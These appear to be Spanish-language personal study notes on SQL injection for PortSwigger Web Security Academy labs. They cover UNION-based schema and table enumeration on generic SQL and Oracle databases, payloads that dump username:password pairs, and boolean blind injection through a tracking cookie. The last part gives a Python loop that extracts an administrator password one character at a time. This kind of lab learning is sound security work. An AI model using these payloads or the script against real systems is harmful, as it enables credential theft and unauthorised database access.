tenemos que: 
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
opcion (COLUMNAS) FROM (desde que tabla queremos ver esos campos) WHERE (POR EJEMPLO UN USUARIO QUE LE INDICAS ENTRE COMILLAS) 
que si vamos a al url podemos cambiarlo de esta manera
academy.net/filter?category=Pets%27%20or%201=1--%20-
si creamos una columna 
```
create table users(id int(32), username varchar(32), subscription varchar(32));
```
así se agrega una nueva fila: 
```
insert into users(username, password, subscritpion) values("txhaka", "a", "12 meses");
```
y para seleccionar por usuario:
```
select * from users where user='txhaka';
```
ahora en la parte del input hacemos cositas
```
select subscription from users where username = 'txhaka' or 1=1;-- -';
```
Ahora vamos a ver otros campos que se pueden alterar con el link, por ejemplo (donde %s es el input)
```
select nombre,apellidos from users where username = '%s' and password = '%s'
```
y si agregamos 
```
select nombre,apellidos from users where username = 'administator'-- -'and passwor = '$s'
```
estaría comentando lo que le sigue, por lo que realizaría una sola petición.
Entonces como queremos quedarnos con solamente administrador le agregamos el -- -, que es para que me interprete con las 3 comillas

Para ver las columnas:
La url, seguida de un /filter o lo que sea /index.html. seguida de una category: filter?category=LaCategoria' union select 1,2 -- -
algo así sería la sintaxis pero esta vez vamos a utilizar el schema.schemata
```
0ad200ed046eb8ef83f00a61008f0004.web-security-academy.net/filter?category=Gifts' union select schema_name,NULL from information_schema.schemata-- -
```
pero en la query es distinto, así se dumpeé todas las tablas existentes de todas las bases de datos
```
union select table_name,NULL from information_schema.tables-- -
```
ahora para dumpear de la parte que quiero utilizo el where y estaría viendo todas las columnas:
```
union select table_name,NULL from information_schema.tables where table_schema='public'-- -
```
si repesamos, la base de datos es marx, la tabla es users, la columna son password, etc. Ahora la sintaxis podría ser más así
```
union select column_name,NULL from information_schema.columns where table_schema ='DB' and table_name = 'tabla'-- -
```
Entonces tenemos la union select que enlaza las filas que ya tenemos con unas nuevas, NULL, column_name, en este caso son dos para que lo tome la página de portswiger, ahora es desde el information_schema.columns que es el método de sql que vamos a utilizar para que nos busque los datos de union select y ahora aclaramos que columna tomamos de referencia (ósea para ver los datos de esa columna) y por último el nombre de la database que en este caso es 'users' en el query link se verría tal que así
```
https://0aa300ed03d94aec80ab084500e80074.web-security-academy.net/filter?category=Corporate+gifts'union select NULL,table_name from information_schema.columns where table_schema ='public' and table_name = 'users'-- -
```
Ahora para que nos muestre todo el contenido de las tablas nos fijamos en lo siguiente:
select es el método de sql que selecciona y es seguido por la columna o database, o lo que mierda sea, from es desde que perspectiva voy a ver los datos y es seguido de una data base o algo de eso where donde nos ubicamos y puede seguir una columna, en este caso username es la columna de los nombres y seleccionamos el nombre. Aplicamos un union select que trae uno datos a la tabla seguido de los datos que queremos que se grafiquen en la tabla, en este caso table_name para el nombre de las tablas y tiene que ser del mismo numeros que las columnas en select, from desde que método le aplicamos que en este caso es el método de sql llamado "information_schema.schemata" o si queremos de las tablas en este caso sería "infromation_schema.tables", un where para indicar cual es la tabla que queremos utilizar, seguido de su nombre precedido por un table_schema
```
select password,subscription from users where username = 'admin' union select table_name,2 from information_schema.tables where table_schema='Marx';-- -';
```
Lo único que hice fue cambiar el método "infromation_schema.tables" por "information_schema.columns", "table_name" por "column_name" y aclarar el nombre de la tabla, porque de otra forma no estaría especificando a que columnas de que tabla leo
Lo mismo si quiero ver todos los de cada columna:
```
select password,subscription from users where username = 'admin' union select column_name,2 from information_schema.columns where table_schema='Marx' and table_name='users';-- -';
```
MOSTRAR SOLO NOMBRE DE USUARIO CON CONTRASEÑA
y si quiero concatenar los valores con un group_concat:
```
select password,subscription from users where username = 'admin' union select 1,group_concat(username,':',password) from users;-- -';
```
también hay que tener en cuenta que buscará en la base de datos en la que estamos situados, para aclarar en que base de datos buscar: ponemos el nombre de la base de datos antecediendo al nombre de la (table en la parte del from)
```
select password,subscription from users where username = 'admin' union select 1,group_concat(username,':',password) from databaseName.users;-- -';
```
las queries de [[portswiger]] son media rompebolas, podemos verla en detalle acá [machetes](https://portswigger.net/web-security/sql-injection/cheat-sheet) pero la concatenaríamos así
```
' union select NULL,username||':'||password from users-
```
| La query que nos muestra los esquemas es esta:
```
'union select NULL,schema_name from information_schema.schemata-- -
```
Suponiendo que en uno de los resultados salió public, y queremos ver solo por sus datos le mandamos así:
```
'union select NULL,table_name from information_schema.tables where table_schema='public'-- -
```
Porque tenemos el nombre de la tabla, peor como también tenemos el nombre de la tabla, le mandamos: 
```
'union select NULL,table_name from information_schema.columns where table_schema='public' and table_name='users'-- -
```
para hacer de los usuarios:
```
'union select NULL,username from users-- -
```
y para filtrar por contaseña
```
'union select NULL,concat(username,':',password) from users-- -
```
para hacerlo con oracle hay que aclarar desde done con un "from DUAL"
```
'union select NULL,banner from v$version-- -
```

Tenemos que aclarar siempre una tabla

Entonces primero mandamos un comando que nos devuelva los esquema
```
'union select NULL,schema_name from information_schema.schemata-- -
```
y ahora si quiero enumerar las tables existentes en esa base de datos
```
union select NULL,table_name from information_schema.tables where table_schema='public'-- -
```
Ahora que nos muestra el nombre del usuario podemos probar para dumpear solo las columnas
```
union select NULL,column_name from information_schema.columns where table_schema='public' and table_name='users_qqhmbb'-- -
```
ahora utilizando los nuevos datos de las columnas después del union select y aclaramos la columna con el from :
```
union select NULL,username_egceik||':'||password_yjkzqt from users_qqhmbb-- -
```

Ahora si estamor en [[Oracle]] es similar pero deberíamos agregarle un 'from dual'
```
union select NULL,NULL from dual-- -
```
Ahora para filtrar TODAS las tablas utilizamos esto
```
union select NULL,table_name from all_tables-- -
```
y para ver el propietario de TODAS las tablas 
```
union select NULL,owner from all_tables-- -
```
Para que me muestre solo las tablas dondepeter sea propietario
```
union select NULL,table_name from all_tables where owner = 'PETER'-- -
```
como dumpeo estas COLUMNAS que estoy viendo 
```
union select NULL,column_name from all_tab_columns where owner = 'PETER'-- -

```
Para ver una especifico

```
union select NULL,column_name from all_tab_columns where table_name = 'USERS_TTRJYX'-- - 
```
ahora utilizamos los datos dados para solicitar una nueva query
```
union select NULL,USERNAME_RJGHSE||':'||PASSWORD_XELVSG from USERS_TTRJYX-- -
```

## Blind injection
Esta vez es cuando no odemos ver los cambios que realizamos, la query no la podemos mandar por el link sino que tenemos que hacer otras cositas
![[Pasted image 20240530160842.png]]
la query por detrás sería algo así
```
select * from products where trackingId='RuR0Bwtk0iBFPd9l' and 1=1-- -'
```
 y para que me tome el comentario concatenamos el código del tracking id a lo que deseemos, seleccionames la a de administrator, como es tru nos mostraría 'Welcome back!' si es fácil no nos mostrará nada
 ```
 trackingId=RuR0Bwtk0iBFPd9l' and (select 'a' from users limit 1)='a;
```
![[Burpsuite blin injection 1.png]]
El from users limit 1 hace que filtres por el carácter especial desde la tabla users
ahora podemos aclarar además, para atentar con una seccion partcicualr con un:
where username='administrator' 
```
 trackingId=RuR0Bwtk0iBFPd9l' and (select 'a' from users whwere username='administrator')='a;
```
ahora quiero seleccionar de un solo una parte del campo, en vez de seleccionar por 'a' seleccionames por un elemento del substring 'substring(username1,1)' seleccionando letra por letra donde username es administrator
```
and (select substring(username,1,1) from users where username='administrator')='a;
```
ahora también podemos ir seleccionando carácter por carácter lo que nos interesa:
```
and (select substring(password,1,1) from users where username='administrator')='a;
```

## Scriptin en python
También puedo filtrar la contraseña por la cantidad de caracteres:
```
and (select substring(password,1,1) from users where username='administrator' and length(password)>=15)='a;
```
ahí estoy filtrando si es mayo o igual de 15 caracteres, sabiendo la cantidad de caracteres hacemos el bucle 
```python
 for position in range(1, 21):

        for character in characters:

            cookies = {

                'TrackingId': "g21O3GCZ7qFu2lWa' and (select substring(password,%d,1) from users where username='administrator')='%s" % (position, character),

                'session': 'dUAzekVjnYpnTbJKLjbYQUHIlCKWgzpK'

            }

  

            r = requests.get(main_url, cookies=cookies)

  

            if "Welcome back!" in r.text:

                password += character

                break
```
primero definimos el rango que va a tener en un bucle
después marcamos los caracteres
cookies es la variable que marca el welcome back que vemos el burpsuite, donde
la r tramitamos una request por cada intento
el if es para detectar si el caracter es válido